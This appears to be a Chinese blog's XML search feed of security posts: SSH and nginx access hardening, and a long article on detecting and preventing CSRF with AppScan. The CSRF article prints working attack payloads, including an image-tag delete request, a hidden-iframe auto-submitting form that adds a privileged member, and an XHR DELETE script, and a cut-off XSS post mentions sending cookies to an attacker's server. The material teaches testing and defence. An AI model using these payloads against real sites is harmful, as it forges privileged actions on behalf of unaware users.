&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有了该session-id，攻击者在会话有效期内即可获得 admin 用户的权限，并且由于攻击数据已添加入数据库，只要攻击数据未被删除，那么攻击还有可能生效，是持久性的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然，不是只有持久型xss攻击才能窃取session ID、用户的cookie信息，用非持久型xss也可以，只要引导用户点击某链接，将 document.cookie 信息传到指定服务器即可，以上仅作为说明持久型xss攻击的举例。]]></content>
      <tags>
        <tag>Linux安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[root账户不允许远程登陆]]></title>
    <url>%2F2017%2F08%2F17%2FLinux%E5%AE%89%E5%85%A8%2F10.%20root%E8%B4%A6%E6%88%B7%E4%B8%8D%E5%85%81%E8%AE%B8%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86%2F</url>
    <content type="text"><![CDATA[root账户不允许远程登陆&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时为了特殊需求，只允许普通账户登陆Linux，而不允许root账户登陆，而普通账户登陆后，然后再su 到root下是可以的。打开sshd的配置文件 1vim /etc/ssh/sshd_config &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入一行： 1PermitRootLogin no &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启sshd服务： 1service sshd restart]]></content>
      <tags>
        <tag>Linux安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[root账户不能使用密码只能使用密钥远程登陆]]></title>
    <url>%2F2017%2F08%2F17%2FLinux%E5%AE%89%E5%85%A8%2F9.%20root%E8%B4%A6%E6%88%B7%E4%B8%8D%E8%83%BD%E4%BD%BF%E7%94%A8%E5%AF%86%E7%A0%81%E5%8F%AA%E8%83%BD%E4%BD%BF%E7%94%A8%E5%AF%86%E9%92%A5%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86%2F</url>
    <content type="text"><![CDATA[root账户不能使用密码只能使用密钥远程登陆&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;打开sshd配置文件 1vim /etc/ssh/sshd_config &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在最后面增加一行 1PermitRootLogin without-password &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存配置文件后重启sshd服务 1service sshd restart]]></content>
      <tags>
        <tag>Linux安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx限制只让某个ip访问]]></title>
    <url>%2F2017%2F08%2F17%2FLinux%E5%AE%89%E5%85%A8%2F8.%20nginx%E9%99%90%E5%88%B6%E5%8F%AA%E8%AE%A9%E6%9F%90%E4%B8%AAip%E8%AE%BF%E9%97%AE%2F</url>
    <content type="text"><![CDATA[nginx限制只让某个ip访问1234567891011server &#123; listen 80; server_name www.aldjflas.cn; access_log /home/logs/bbs/access.log combined buffer=32k; error_log /home/logs/bbs/error.log warn; index index.html index.htm index.php; root /data/www/wwwroot/bbs; allow 219.232.244.234; deny all;&#125;]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>Linux安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx禁止某个IP或者IP段访问站点的设置方法]]></title>
    <url>%2F2017%2F08%2F17%2FLinux%E5%AE%89%E5%85%A8%2F7.%20nginx%E7%A6%81%E6%AD%A2%E6%9F%90%E4%B8%AAIP%E6%88%96%E8%80%85IP%E6%AE%B5%E8%AE%BF%E9%97%AE%E7%AB%99%E7%82%B9%E7%9A%84%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[nginx禁止某个IP或者IP段访问站点的设置方法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先建立下面的配置文件放在nginx的conf目录下面,命名为deny.ip 1cat deny.ip 123deny 192.168.1.11;deny 192.168.1.123;deny 10.0.1.0/24; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在nginx的配置文件nginx.conf中加入： 1include deny.ip; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启一下nginx的服务： 1/usr/local/nginx/sbin/nginx reload &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;就可以生效了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;deny.ip 的格式中也可以用deny all; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果你想实现这样的应用，除了几个IP外，其他全部拒绝， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;那需要你在deny.ip 中这样写 123allow 1.1.1.1; allow 1.1.1.2;deny all;]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>Linux安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx 使用 user_agent 控制客户端访问]]></title>
    <url>%2F2017%2F08%2F17%2FLinux%E5%AE%89%E5%85%A8%2F6.%20nginx%20%E4%BD%BF%E7%94%A8%20user_agent%20%E6%8E%A7%E5%88%B6%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%BF%E9%97%AE%2F</url>
    <content type="text"><![CDATA[nginx 使用 user_agent 控制客户端访问&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nginx的日志格式中，有一个字段叫做 $http_user_agent 这个其实是客户端浏览器的一个信息，比如咱们平时使用IE浏览器的话，nginx的日志中会记录类似于这样的信息： 1Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这一段信息就是 $http_user_agent 了。咱们可以根据这个特点来控制客户端的请求访问。比如，现在有这样一个需求 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把使用IE 6.0 的客户端禁止访问，我们可以这样做： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在nignx的配置文件中，加入 12345location / &#123; if ($http_user_agent ~ 'MSIE 6.0')&#123; return 403; &#125;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就能禁止使用IE 6.0的客户端访问服务器。]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>Linux安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx 禁止通过ip访问站点]]></title>
    <url>%2F2017%2F08%2F17%2FLinux%E5%AE%89%E5%85%A8%2F5.%20nginx%20%E7%A6%81%E6%AD%A2%E9%80%9A%E8%BF%87ip%E8%AE%BF%E9%97%AE%E7%AB%99%E7%82%B9%2F</url>
    <content type="text"><![CDATA[nginx 禁止通过ip访问站点&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在server部分加如下代码： 12345server &#123; listen 80 default; server_name suibian.com; #这里的域名可以乱填一个 deny all;&#125;]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>Linux安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web 应用程序常见漏洞 CSRF 的入侵检测与防范]]></title>
    <url>%2F2017%2F08%2F17%2FLinux%E5%AE%89%E5%85%A8%2F3.%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%20CSRF%20%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E8%8C%83%2F</url>
    <content type="text"><![CDATA[Web 应用程序常见漏洞 CSRF 的入侵检测与防范&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;互联网的安全问题一直存在，并且在可预见的未来中没有消弭的迹象，而在软件开发周期中，加入对产品安全问题的检测工作，将极大的提升对应安全问题解决的成本，对维护一个好的产品形象至关重，在竞争愈烈的网络应用产品中的生命力也将更长。本文要介绍的跨站请求伪（CSRF）在众多的攻击手段中，更具备隐蔽性，同时有更高的危害性。笔者将对其的基本特性，攻击手段，危害及防范手段，以及如何使用 Rational AppScan 对 CSRF 攻击做检测及分析做一个系统的阐述。 CSRF 的基本概念特性&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;跨站请求伪造（CSRF）的是 Web 应用程序一种常见的漏洞，其攻击特性是危害性大但非常隐蔽，尤其是在大量 Web 2.0 技术的应用的背景下，CSRF 攻击完全可以在用户法毫无察觉的情况下发起攻击。国际上并未对 CSRF 攻击做出一个明确的定义，同时，攻击的发起手段方式繁多，下文会做详细介绍。可以解释的是发起的目标都是通过伪造一个用户请求，该请求不是用户想发出去的请求，而对服务器或服务来说这个请求是完全合法的一个请求，但是却完成了一个攻击者所期望的操作，比如添加一个用户到管理者的群组中，或将一个用户的现金转到另外的一个帐户中。通常开发人员对 CSRF 攻击的理解是有误区的，分为以下几方面，第一是如何攻击的，第二是危害到底在那里，第三是如何防范就才是一个完整的解决方案。本文就是要对这些基本的问题做一个详细的阐述，并且给出检测的有效方法。 CSRF 的危害实例&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;大部分网站往往对脚本注入有严格的防范，但是对 CSRF 的防范做的就差很多。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实例 1：假设某网站高级会员会享有某些特殊权限。而当一个普通用户付款完毕就可以让管理员将自己升级为高级会员。假设管理员将一个普通用户升级为高级会员的请求是： http://www.mysite.com/promoteUser.jsp?username=aaaaa &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们再假设普通用户有在网站某个论坛发表话题的权限，这样一个普通用户可以将这个 URL 发表在某些话题之中，然后用我们称为社会工程学的方法引诱网站管理员点击这个链接。当管理员点击这个链接时，这个请求就会从浏览器发送到后台服务器，从而完成身份的升级。当然，在实际攻击过程中，有很多手段使得让管理员不点击也能发送这样的请求，比如将这个 URL 设置为某个图片的源。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实例 2：以一个二手跳蚤市场为例子，比如某商业交易网站注册用户 Hacker01 和 Customer01。Hacker01 在上交易频道摆上 1 辆 9 成新的宝马，投标价格是 20000$，另外再摆上另外一量废旧车型标价 1000$，然而网站是允许加载图片显示车的状况的。 所以宝马车主可以上载一个自己的图片，废旧车主也可以上载一个自己的图片。 宝马图片 url:http://myrepository/BMW.jpg car id 100000001 废旧车图片 url:http://myrepository/oldCar.jpg car id 100000002 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而该拍卖网站是通过投标决定车的最终价格，假设是竞买者参加竞买宝马的时候点击购买按钮浏览器是通过发一个 GET 请求到 http://e-bussiness-car/bid?value=20000$&amp;carid=100000001 来提交自己的竞标价格。那么 Hacker01 则可以把废 旧车图片修改为 http://e-bussiness-car/bid?value=20000$&amp;carid=100000001（或者其他的 value 参数的数值）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这时候的情况是：Customer01 访问宝马能看见正确的图片，并且没有任何问题。而访问废旧车发现图片是一个无法看到的图片，但当 Customer01 浏览旧车图片的时候，浏览器已经向宝马车发送了一个竞标请求。这样在用户的控制之外发出了一个合法的请求，并且被服务器接收。Hack01 可以在 Customer01 不知觉的情况下将自己的宝马车卖出。通过此例可以发现 CSRF 有着非常严重的危害性。 CSRF 攻击的基本路径及方法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HTTP 协议中定义了，GET/POST/PUT/DELETE 四种基本操作方法如图 1 标记-1 所示 GET/POST 是所有网站或服务器必须使用的操作方法，而 PUT/DELETE 功能强大，但是在以往的应用中并没有被广泛的使用，直到 Web 2.0 的出现，Ajax 的引用导致 PUT/DELETE 在 REST 框架下被发扬光大，大量使用，也使 CSRF 的攻击手段中多了一种 攻击方式。本文以常用的 GET/POST 为实例，这两者是被浏览器用作与服务起进行数据交互的主要手段，并包含 Ajax 框架下的攻击介绍。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CSRF 攻击的方法多种多样，而对这些攻击方法的认识将更有助于去检查或在产品设计中加入对 CSRF 攻击的防范使整个产品的开发的代价更小。按照攻击的方式来看，分为显式攻击和隐式攻击。显示攻击对用户来说是可以察觉的，例如通过各种方法向受害者发送链接，而隐式攻击则很难察觉，往往是访问了一个有漏洞的页面，或者一个恶意的页面，使用频率更多的则是隐性攻击，因为其更具备可操作性。下边介绍到的攻击方法都可以采取隐式攻击方法。要注意的是，用户网站是否存在脚本注入的漏洞，并不影 响 CSRF 攻击，通过使用第 3 方存在安全隐患的网站一样可以完成 CSRF 攻击。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对图 1 的基本解释，标记-1 是合法用户对用户网站的访问，执行合法有效的操作；标记-2 是通过邮件系统对用户发动攻击；标记 3 是利用 Web 的网站，包括用户的操作网站，普通网站，以及黑客网站，标记-4、5、6 指的是有害用户（标记-3）利用的 3 种方式来攻击受害用户。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;图 1. CSRF 攻击示意图 对 GET 请求的 CSRF 漏洞的攻击方式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;GET 请求使用的频率最高，隐式的 GET 请求，例如 ，在页面中引入上述页面元素，并且设置 SRC 属性就能在用户未知的情况下发出一个 GET 请求到想去攻击的网站。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以 IMG 标签为例，攻击者可以通过在图 1 中的标记-5、标记-6、标记-2、标记-4 的途径发起攻击。这种攻击的特征是无明显提示，但是已经发出一个具有完整合法的用户请求。 1&lt;img src=http://UserSite/admin/deletepage?id=74NBCDSEFG/&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于一个大量采用 GET 请求的网站，隐式的通过 http 标签发出一个 GET 请求将是致命的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;具体的可执行情形描述将在如何检测部分给出。 对 POST 请求的 CSRF 漏洞的攻击方式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对 CSRF 有一种理解是把 GET 改为 POST 请求就认为是可以防止被攻击实际上是一种错误的理解，通过使用 一样可以完成一个隐式的 CSRF 攻击，具体脚本写法如下。 清单 1. Frame1.html 脚本12345678910111213141516171819202122232425&lt;script&gt;function post(url, fields) &#123; var p = document.createElement('form'); p.action = url; p.innerHTML = fields; p.target = '_self'; p.enctype = 'multipart/form-data'; p.method = 'post'; document.body.appendChild(p); p.submit();&#125;function csrf_hack() &#123; var fields; var csrf="&lt;addMember dnName="CN=manager 9/OU=Managers/OU=Users/O=QDSVT/DC=CN/DC=IBM/DC=COM" accessLevel="Author" isPerson="1" isLocal="0"/&gt;"; fields += "&lt;input type='' name='action' value='"+csrf+"'&gt;"; unescape(fields); post('http://usersite:80/dm/services/DocumentService?do401=true',fields); alert("csrf_end");&#125; csrf_hack(); alert('end')&lt;/script&gt; 清单 2. IFrame.html1&lt;IFRAME src=./frame1.html width=0 height=0&gt;&lt;/IFRAME&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这段代码通过脚本构造一个表单提交，通过 IFRAME 加载页面自动执行本例，IFRAME 宽高属性设置成零的目的是为了达到隐式攻击的效果，JAVASCRIPT 只对窗口的大小有不成文的规范，宽高不能小于 50 像素点，但是对 iframe 并没有要求，这为隐式的跨域 Post 攻击提供了一个量好的途径。写成脚本的形式并不是说明只要被检测的站点没有脚本注入就没有任何问题，POST 隐式攻击方式一样可以通过第 3 方，如图 1，4，5，6 攻击路径都适合本例的使用。 Web 2.0 攻击方式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Web 2.0 技术因其能大幅度提升用户的体验，已经被非常广泛的使用，并且 Web 2.0 技术对跨站请求的提交有严格的检查，所以一般不用担心来自第三方的 xmlhttp 发出的 CSRF 攻击。Web 2.0 技术如果在本站点存在脚本注入漏洞，将会产生严重的 CSRF 攻击问题；另外一条攻击路径则是通过邮件系统，向受害用户发送带有 xmlhttp 请求的脚本文件，是否产生危害取决于用户是否执行该文件，危害性明显低于前两种。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于发邮件，或者网站上传的文件发起攻击的案例是由 IE 的特性造成，由于 IE 允许从本地域 (local domain) 对任意域发送，一个包含 Web 2.0 代码的例子就能使 IE 完成成一次离线状态的攻击，IE 允许通过对策略的修改以达到严格的安全配置，从而禁止对同域内容的访问。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下是通常使用的对 Web 2.0 类型的跨站漏洞的攻击代码。 清单 3. 通常使用的对 Web 2.0 类型的跨站漏洞的攻击代码1234567891011121314151617181920212223&lt;script&gt;alert('start delete');var payload="&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"&gt;&lt;soap:Header&gt; &lt;serviceVersion&gt;8.0.0 &lt;/serviceVersion&gt;&lt;/soap:Header&gt;&lt;soap:Body&gt;&lt;deleteDocument xmlns="http://webservices.clb.content.ibm.com"&gt; &lt;path&gt;/@Pcsrftestplace/@RMain.nsf/@F/@DE44FD4FF0956D07648257570002C42DA &lt;/path&gt; &lt;/deleteDocument&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;";alert(message);var client = new XMLHttpRequest(); client.open("POST", "http://usercite.com /files/form/api/collections/ 2d0f6188-8872-4722-8922-3a3c842aa443/entry?format=xml "); client.setRequestHeader("Content-Type", "text/plain;charset=UTF-8"); client.setRequestHeader("x-method-override","DELETE"); client.setRequestHeader("x-requested-with","XMLHttpRequest"); (you can customized the header if you need) client.send("");&lt;/script&gt; &lt;html&gt; 登陆 CSRF 攻击方式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;登陆式的跨站请求伪造是一种较新的攻击方式，让用户错误的以为是用自己的帐户密码登陆，实际上是登录到一个 Hacker 的账户。这种攻击方式的最显著的特征是，Hacker 可以监听到用户的实际操作，通过查询历史记录可以知道用户做了那些操作，如果是在商业网站则会在历史记录中留下信用卡号，如果是在个人信息相关系统则会留下用户的隐私操作。 使用 Rational AppScan 对 CSRF 的检测&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;APPSCAN 是 IBM 收购 WatchFire 之后获得一款强大的网络安全的检测工具，目前属于 Rational 产品线，功能集中在网络应用产品的检测防范上，分静态与动态两种不同的功能，覆盖代码与产品的两端检测需求。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;APPSCAN 自从 7.7 的版本以后加入对 CSRF 的防范，基本原理是通过对同一个需要检测的 URL 或者 SERVICE 按照顺序发出两次请求，发送两次请求之间会做一次退出登录状态的操作，如果一个对 CSRF 已经进行防范的网站是会发送回两个不同的回应内容。实例的说明如下。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;请求 1 12345GET/POST http://myproduct.com/services?action=remove&amp;id=10002Headers ….. ….. Content: …… &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;返回内容 1 123Response 200Headers …. …..Content:….. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;请求 2 12345GET/POST http://myproduct.com/services?action=remove&amp;id=10002Headers ….. ….. Content: …… &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;返回内容 2 123Response 200Headers …. …..Content:….. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;返回内容 1 和返回内容 2 如果是完全一致的则可以认为是有问题的，反之则可以认为是没有问题。看似简单的原理，在实际操作中有个很繁琐的逻辑问题，比如请求 1 是一个删除动作，那么如何去构造一个请求 2，并且获得一个一致的结果呢？解决的办法是，要先做一个操作 1，然后再创建一个同样的 1，再做操作 2。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从上述的简单例子就可以发现有效监测 CSRF 是一个较为繁琐的过程。AppScan 的检测前提就是对目标资源的操作在不同的一个 Session 中返回的内容肯定是应该不一样的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里要注意的问题是误报，Web 应用程序操作大多都是对一个固定的 URL 的请求，包含一些资源文件，以及一些功能性的请求。对于资源文件的操作，很多情况下都是一个静态的请求，在未使用 PUT/DELETE 的应用程序，是无需对 GET 请求进行 CSRF 测试，在这种情况下是不存在 CSRF 漏洞的。而如果使用了 Ajax 框架的应用程序如果存在 DELETE/PUT 操作则需注意很可能出现严重的 CSRF 问题。未使用 Ajax 的产品则集中在 GET/POST 请求，需要注意的是 GET/POST 请求对 CSRF 来说是同样具有可操作性的，对产品的危害性是一致的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对 CSRF 测试的两个主要方向是路径覆盖测试，和精确测试。之所以是要做如此分类的原因是一个产品有大量的 URL 如果一一测试需要大量的时间精力，覆盖测试是由工具去完成的是为了保证覆盖到产品的各个路径，有些产品实际上已经对 CSRF 有很深的认识，在这种情况下大多数资源已经被很好的保护起来，没有 CSRF 的问题，这时候一个对全路径的测试就是很必要的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;精确测试是由人来完成的通过分析产品功能和开发人员的沟通，阅读设计文档来完成的。为何要做精确测试的原因是，所有 Web 应用程序非常关注的问题之一就是产品的性能，而对所有请求都做 CSRF 防范的话就比如在一个高速公路上设置一个人工收费站一样会大大影响性能，一个好的 Web 应用在对 CSRF 防范是有针对性的，对一个没有 CSRF 保护的产品，一个良好的 CSRF 保护开端可以是由精确测试的结果为发起的。通过对固定功能的检测，以及对设计文档的了解，基本就可以断定产品是否做了 CSRF 保护。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个正常的使用 Appscan 来检测 CSRF 的流程如图 2 所示。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;图 2. 一个正常的使用 Appscan 来检测 CSRF 的流程 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;AppScan 使用流程，AppScan 执行过程的一个分解，如图 3。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;图 3. AppScan 执行过程的一个分解 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;精确测试的方法，目的是为了检测是否存在 CSRF 保护。对 CSRF 保护有个范围约束的问题，并不是所有的请求都需要对 CSRF 攻击做防范。对静态资源除非有 DELETE/PUT 操作允许的情况下，才需要进行测试；而对于关键的业务逻辑，比如银行转帐，确认收货人信息，参加竞标，删除一个用户，赋予用户高级权限，等等，对这类定性问题的约束是根据不同的商业产品各异，要具体问题具体分析。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;本例以常见的页面删除为实例，阐述一个可以的测试方法。大概分为以下几种情况 :使用 GET 来删除页面的，使用 DELETE/PUT 来删除页面的，使用 POST 来删除页面的，都是服务器与客户端的交互过程，具体的实例分析起来要远比分类更为复杂，一个 操作可能带有很多各样的请求，找到有威胁的请求才是最终目的，有时候哪怕是 AppScan 已经定位到具体是那个请求，也还需要通过手工将这个案例找出加以描述成为 有实际操作价值的场景，这里就需要引入手工测试工具加以支持。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;手工工具的介绍，做精确测试需要对 HTTP 请求做频繁的操作，如果需要查看请求的内容，还有对具体请求的操作的观察，推荐使用 Fiddler 或者 WebScarab。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;开始手动验证之前，还需要清楚 CSRF 发生的条件。所有的问题的发生有个前提条件是用户常用的浏览器中有一个与目标服务器处于激活状态的会话。这个条件需要的原因是，CSRF 攻击的模式是用户 A 被恶意用户 B 所攻击，攻击是 B 发起的被用户 A 执行实现的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而 B 往往是在 A 常去的网站注入代码，或者发送链接或者包含附件的文件给 A，而包含着恶意代码或者链接的页面要被执行，条件是用户 A 已经处在和服务器的会话之中，这也是 CSRF 发生的前提条件，也是手工测试的基础。 对 GET CSRF 漏洞的测试&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;GET 请求的情况下，请求如 http://mysite/service?action=delete&amp;pageid=100001 这类问题的验证最为直接，并且无需写脚本和使用 fiddler 工具去观察实际的请求的格式。检测方法就是在维持一个与服务器连接的前提下，在浏览器地址栏输入如下网址，如果实际的页面被删除了就是 CSRF 攻击成功了。对于如此清楚的实例基本看到 URL 已经可以证明没有任何 CSRF 保护。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可关联的攻击场景如下，在任何可以显示图片的地方写入如下 ，另外只需 要指引有删除权限的用户访问一下包含这个图片标签的网页，往往是通过发一个邮件或者 MSN 一个简单的链接就可以完成删除页面的操作。 对 POST CSRF 漏洞的测试&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;POST 请求的操作并不能免除 CSRF 的攻击。在浏览器中要发出 POST 请求，可以使用两种方法，一个是通过脚本调用页面文档元素 form 直接进行提交操作，特点是可以进行跨域的脚本提交，隐式攻击。另一种是通过使用 Ajax 对象直接发出请求，但是由于不能跨域发出请求，可执行的力度并不高，但是还是有可能性。同样是一个删除页面的操作，如下所示结构。 1234POST http://mysite/serviceHeaders….Action=delete&amp;pageid=100001 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个不同于 GET 之处是不能简单的通过在浏览器直接输入一个链接就能测试。需要借助一下预设好的 HTTP 服务器如 IBM HTTP Server、Domino，或者 IIS。将 IFrame.html 的清单拷贝到服务器的一个目录。通过修改 frame1.html 中的 csrf_hack() 如下。 清单 4. 修改 frame1.html 中的 csrf_hack()12345678function csrf_hack() &#123; var fields; fields += "&lt;input type='' name='action' value='"+"delete"+"'&gt;"; fields += "&lt;input type='' name=pageid value='"+"1000001" +"'&gt;"; unescape(fields); post('http://mysite/service ',fields); alert("csrf_end");&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可关联的攻击场景如下 ，通过邮件或者 MSN 发送一个链接 http://hackerWebServer/iframe 给可以删除页面的用户，该操作就会被执行，如果页面删除，攻击成功。通过在其他网站可以做脚本注入的将 iframe.html 脚本写在该网站， 一样可以达到攻击效果。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另一类通过 Ajax 提交的 post 请求，这类结构中多采用 SOAP message 或者类似的 XML 消息体，或者 Jason 消息体提交请求。结构如下。 123456789101112POST http://mysite/serviceHeaders….&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"&gt;&lt;soap:Header&gt;&lt;serviceVersion&gt;8.0.0&lt;/serviceVersion&gt;&lt;/soap:Header&gt;&lt;soap:Body&gt;&lt;deleteDocument xmlns="http://webservices.clb.content.ibm.com"&gt; &lt;path&gt;/@Pcsrftestplace/@RMain.nsf/@F/@DE44FD4FF0956D07648257570002C42DA&lt;/path&gt;&lt;/deleteDocument&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在此类情况下，需要修改 form 的表单的 enctype 属性为 multipart/form-data，因为在默认的情况下是 application/x-www-form-urlencoded，所有字符都会做 URL 编码转换，提交的数据是不合法的无法被服务器端识别，所以需要修改 enctype 属性，在 multipart/formdata 的情况下，数据是不会被编码的，而在很多服务器的接收端有的就是 使用 multipart/formdata 去接受数据。由于 javascript 出于对安全的考虑禁止脚本自动修 改 form 中提交的 file 属性的输入的值，所以想通过脚本修改控制 enctype 是不允许的，这样不同于第一类 POST 请求。但是并不影响场景的合理性，通过在有漏洞的网站伪造表单请求，form 指向我们要操作的 URL 即可。这种情况下，需要构造一个完整的表单，并通过用户点击一个任意方式发送的链接达到攻击效果。 对 DELETE/PUT CSRF 漏洞的测试&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DELETE/PUT 请求依赖于 Web 2.0 技术，由于本身的限制，自由发出跨站的伪造请求是不可能的。更多使用的是离线攻击，或者本站点的脚本注入攻击。在存在本站点脚本注入攻击的情况下，所有这 4 种情况下，都可以完成隐式的攻击方式。代码请参照 Web 2.0 攻击章节的实例。 CSRF 的防范&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CSRF 的防范机制有很多种，防范的方法也根据 CSRF 攻击方式的不断升级而不断演化。常用的有检查 Refer 头部信息，使用一次性令牌，使用验证图片等手段。出于性能的考虑，如果每个请求都加入令牌验证将极大的增加服务器的负担，具体采用那种方法更合理，需要谨慎审视每种保护的优缺点。 检查 HTTP 头部 Refer 信息，这是防止 CSRF 的最简单容易实现的一种手段。根据 RFC 对于 HTTP 协议里面 Refer 的定义，Refer 信息跟随出现在每个 Http 请求头部。Server 端在收到请求之后，可以去检查这个头信息，只接受来自本域的请求而忽略外部域的请求，这样就可以避免了很多风险。当然这种检查方式由于过于简单也有它自身的弱点： 首先是检查 Refer 信息并不能防范来自本域的攻击。在企业业务网站上，经常会有同域的论坛，邮件等形式的 Web 应用程序存在，来自这些地方的 CSRF 攻击所携带的就是本域的 Refer 域信息，因此不能被这种防御手段所阻止。 同样，某些直接发送 HTTP 请求的方式（指非浏览器，比如用后台代码等方法）可以伪造一些 Refer 信息，虽然直接进行头信息伪造的方式属于直接发送请求，很难跟随发送 cookie，但由于目前客户端手段层出不穷，flash，javascript 等大规模使用，从客户端进行 refer 的伪造，尤其是在客户端浏览器安装了越来越多的插件的情况下已经成为可能了。 使用一次性令牌，这是当前 Web 应用程序的设计人员广泛使用的一种方式，方法是对于 Get 请求，在 URL 里面加入一个令牌，对于 Post 请求，在隐藏域中加入一个令牌。这个令牌由 server 端生成，由编程人员控制在客户端发送请求的时候使请求携带本令牌然后在 Server 端进行验证。但在令牌的设计上目前存在着几个错误的方案： 使用和 Session 独立的令牌生成方式。这种令牌的值和 Session 无关，因此容易被其他用户伪造。这里的其他用户指的是当前 Web 应用程序的其他用户和活跃在网络传输阶段各个设置上的监听者，这种恶意用户可能使用自己的令牌来进行替换以便达到伪造的目的。 完全使用 Session 认证信息作为令牌的生成方式。这种保护方式对于保护 CSRF 是起了作用的，但是可能会造成其他危害，具体来说，如果某些 URL 或者网页被拷贝下来与其他人共享，那么这些 URL 